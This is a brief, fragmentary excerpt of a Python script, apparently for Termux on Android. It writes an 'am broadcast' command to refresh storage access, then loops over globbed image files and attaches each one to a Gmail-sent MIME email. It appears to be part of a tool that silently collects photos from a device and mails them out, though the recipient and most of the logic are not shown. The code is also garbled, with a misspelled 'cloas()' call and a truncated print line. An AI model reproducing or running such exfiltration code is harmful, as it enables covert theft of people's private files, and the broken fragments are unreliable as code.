...
##################################################
	try:
		...
		qwert.write('am broadcast --user 0                  --es com.termux.app.reload_style storage                  -a com.termux.app.reload_style com.termux > /dev/null')
		qwert.cloas()
...
#################################################################
							os.system('clear')
							print("\033[1;31m[\033[1;33m*\033[1;31m]\033[1;32m Starting \033[1;31m.\033[1;33m .\033[1;32m .\033[1>
							for img in glob(a):
								attach = img
								msg = MIMEMultipart()
								msg['From'] = gmail_user
